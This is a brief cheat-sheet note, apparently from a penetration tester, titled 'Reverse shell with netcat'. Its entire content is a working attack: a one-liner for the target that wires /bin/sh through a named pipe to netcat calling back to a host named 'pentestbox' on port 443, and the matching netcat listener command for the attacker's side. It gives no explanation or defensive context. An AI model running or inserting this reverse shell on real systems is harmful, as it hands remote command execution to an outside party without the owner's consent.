# Reverse shell with netcat

On the target behind a NAT : 

```
/bin/sh -c "/bin/sh 0</tmp/backpipe | nc pentestbox 443 1>/tmp/backpipe"
```

On the pentest side :

```
nc -nvlp 443
```


TAGS : security netcat shell reverse
DATE : 21 07 2019